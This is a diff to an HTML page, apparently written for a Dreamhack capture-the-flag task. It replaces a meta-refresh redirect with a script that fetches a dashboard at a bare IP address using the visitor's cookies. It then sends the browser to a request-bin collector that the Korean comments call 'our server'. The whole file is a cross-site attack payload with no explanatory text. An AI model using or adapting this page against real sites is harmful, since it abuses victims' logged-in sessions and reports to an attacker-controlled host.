@@ -1,9 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta http-equiv="refresh" content="0;url=http://65.109.202.184/dashboard">
-</head>
 <body>
-redirecting...
+<script>
+  // dashboard를 한 번 로드
+  fetch("http://65.109.202.184/dashboard", { credentials: "include" })
+    .then(() => {
+      // 그 직후, 우리 서버로 요청
+      location.href = "https://yqjcgzf.request.dreamhack.games/after";
+    });
+</script>
 </body>
 </html>
